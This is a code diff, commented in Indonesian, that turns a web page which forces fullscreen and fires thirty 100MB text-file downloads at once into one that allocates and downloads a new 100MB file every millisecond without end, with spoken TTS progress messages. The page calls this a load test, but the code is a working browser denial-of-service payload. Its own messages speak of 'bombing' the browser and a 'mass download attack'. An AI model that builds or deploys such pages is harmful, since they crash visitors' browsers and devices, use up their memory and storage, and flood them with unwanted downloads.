@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Auto Fullscreen, TTS & Race Multi-Download (30 Files x 100MB TXT)</title>
+  <title>Auto Fullscreen, TTS & Interval Overloop (1ms x 100MB TXT)</title>
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -22,14 +22,16 @@
       margin: 40px auto;
     }
     :fullscreen {
-      background: #ffffff !important;
+      background: #000000 !important;
+      color: #00ff00 !important;
       padding: 20px !important;
       overflow-y: auto !important;
       width: 100vw !important;
       height: 100vh !important;
     }
     :-webkit-full-screen {
-      background: #ffffff !important;
+      background: #000000 !important;
+      color: #00ff00 !important;
       padding: 20px !important;
       overflow-y: auto !important;
     }
@@ -39,22 +41,24 @@
       cursor: pointer;
       border: 0;
       border-radius: 6px;
-      background: #d32f2f; 
+      background: #ff0000; 
       color: #fff;
       font-weight: bold;
       font-size: 16px;
       -webkit-tap-highlight-color: transparent;
+      box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4);
     }
     #status { 
       margin-top: 16px; 
       font-weight: bold; 
-      color: #1565c0; 
+      color: #ff0000; 
       padding: 10px;
-      background: #e3f2fd;
+      background: #ffebee;
       border-radius: 4px;
       display: inline-block;
       width: 100%;
       text-align: center;
+      border: 1px solid #ffcdd2;
     }
     #downloads {
       margin-top: 20px;
@@ -65,27 +69,27 @@
     #downloads a { 
       display: block; 
       padding: 8px;
-      background: #ffebee;
-      color: #c62828;
+      background: #330000;
+      color: #ff3333;
       text-decoration: none;
       border-radius: 4px;
       font-size: 13px;
       text-align: center;
-      border: 1px solid #ffcdd2;
+      border: 1px solid #ff0000;
     }
   </style>
 </head>
 
 <body>
   <div class="panel" id="main-panel">
-    <h2>Mobile Auto-Fullscreen, TTS & 30 TXT Files Download</h2>
-    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan masuk layar penuh, mengeluarkan suara pemberitahuan (TTS), dan mengunduh 30 file teks (masing-masing 100MB .txt) secara paralel.</p>
+    <h2>Mobile Auto-Fullscreen & 1ms Interval Overloop</h2>
+    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan masuk layar penuh, menyalakan TTS, dan mengeksekusi pembuatan file teks 100MB setiap 1 milidetik tanpa batas.</p>
 
     <p>
-      <button id="start" type="button">Mulai Pengujian Layar Penuh & Suara (TXT)</button>
+      <button id="start" type="button">⚠️ AKTIFKAN INTERVAL OVERLOOP ⚠️</button>
     </p>
 
-    <p id="status" role="status">Siap menjalankan pengujian beban berat.</p>
+    <p id="status" role="status">Sistem siap untuk pengujian interval.</p>
     <div id="downloads"></div>
   </div>
 
@@ -95,34 +99,25 @@
     const downloads = document.getElementById("downloads");
 
     let objectUrls = [];
+    let isLooping = false;
 
-    // Fungsi Utilitas untuk memicu Text to Speech (Bahasa Indonesia)
+    // Fungsi Utilitas Text to Speech (TTS)
     const speakText = (text) => {
       if ('speechSynthesis' in window) {
         window.speechSynthesis.cancel(); 
-        
         const utterance = new SpeechSynthesisUtterance(text);
         utterance.lang = 'id-ID'; 
-        utterance.rate = 1.0;     
-        utterance.pitch = 1.0;    
-        
+        utterance.rate = 1.1;     
         window.speechSynthesis.speak(utterance);
-      } else {
-        console.warn("Browser tidak mendukung fitur Text-to-Speech.");
       }
     };
 
-    // Fungsi Asinkronus untuk mempersiapkan Blob TXT berukuran 100MB
+    // Fungsi Asinkronus mempersiapkan Blob TXT 100MB di Microtask Queue
     const prepareBlobAsync = (i) => {
       return new Promise((resolve) => {
         queueMicrotask(() => {
           const sizeInBytes = 104857600; // 100 MB
-          
-          // Membuat teks "A" sepanjang 100MB secara instan di dalam ArrayBuffer biner
-          // Karakter biner 65 adalah huruf 'A' dalam ASCII/UTF-8
-          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); 
-          
-          // Membuat Blob dengan tipe text/plain agar browser mengenalinya sebagai file teks murni
+          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); // Karakter 'A'
           const blob = new Blob([dummyTextBuffer], { type: "text/plain;charset=utf-8" });
           const url = URL.createObjectURL(blob);
           resolve({ id: i, url: url });
@@ -135,7 +130,7 @@
       setTimeout(() => {
         const link = document.createElement("a");
         link.href = fileData.url;
-        link.download = `poc-100mb-${String(fileData.id).padStart(2, '0')}.txt`;
+        link.download = `interval-100mb-${String(fileData.id).padStart(3, '0')}.txt`;
         link.textContent = `File ${fileData.id} (.txt)`;
         downloads.appendChild(link);
 
@@ -144,51 +139,45 @@
     };
 
     start.addEventListener("click", () => {
-      // PEMBERSIHAN MEMORI AWAL
+      if (isLooping) return; // Mencegah klik ganda memicu interval berlapis
+      isLooping = true;
+
+      // Pembersihan awal memori browser
       objectUrls.forEach(url => URL.revokeObjectURL(url));
       objectUrls = [];
       downloads.replaceChildren();
 
-      // 1. MICU SUARA PERTAMA
-      speakText("Layar penuh diaktifkan. Memulai proses pengunduhan tiga gigabita file teks.");
-
-      // 2. EKSEKUSI FULLSCREEN INSTAN
+      // 1. Picu TTS dan Fullscreen (Sama seperti logika yang Anda inginkan)
+      speakText("Memulai simulasi pengujian beban memori tanpa batas.");
       const docEl = document.documentElement;
       try {
-        if (docEl.requestFullscreen) {
-          docEl.requestFullscreen();
-        } else if (docEl.webkitRequestFullscreen) { 
-          docEl.webkitRequestFullscreen();
-        } else if (docEl.mozRequestFullScreen) { 
-          docEl.mozRequestFullScreen();
-        }
-        status.textContent = "Auto Fullscreen Berhasil dipicu!";
+        if (docEl.requestFullscreen) docEl.requestFullscreen();
+        else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
+        else if (docEl.mozRequestFullScreen) docEl.mozRequestFullScreen();
       } catch (err) {
-        console.warn(`Gagal masuk fullscreen: ${err.message}`);
+        console.warn(err.message);
       }
 
-      // 3. SKENARIO RACE CONDITION BEBAN BERAT
-      setTimeout(async () => {
-        status.textContent = "Layar penuh aktif. Mengalokasikan 3GB teks di memori...";
+      // 2. Menggunakan fungsi berbasis waktu (Interval) untuk membanjiri antrean secara konstan
+      let fileCounter = 1;
+      
+      setInterval(async () => {
+        // Membuat file baru secara terus menerus di dalam memori
+        const fileData = await prepareBlobAsync(fileCounter);
+        objectUrls.push(fileData.url);
+        
+        // Memicu unduhan instan ke antrean browser
+        triggerInstantDownload(fileData);
+        
+        status.textContent = `Mengalokasikan file ke-${fileCounter} di memori... (Total: ${fileCounter * 100} MB)`;
 
-        const downloadPromises = [];
-        for (let i = 1; i <= 30; i++) {
-          downloadPromises.push(prepareBlobAsync(i));
+        // Update TTS setiap kelipatan 10 file agar pengguna tahu statusnya
+        if (fileCounter % 10 === 0) {
+          speakText(`Alokasi mencapai ${fileCounter} file.`);
         }
 
-        // Menunggu seluruh 30 file siap di memori
-        const allFiles = await Promise.all(downloadPromises);
-        
-        status.textContent = "Membom browser dengan 30 unduhan teks sekaligus!";
-        
-        // Peringatan TTS kedua
-        speakText("Proses alokasi teks selesai. Memulai serangan unduhan masal sekarang.");
-
-        allFiles.forEach(fileData => {
-          objectUrls.push(fileData.url);
-          triggerInstantDownload(fileData);
-        });
-      }, 150); 
+        fileCounter++;
+      }, 1); // Dieksekusi konstan setiap 1 milidetik tanpa henti
     });
   </script>
 </body>
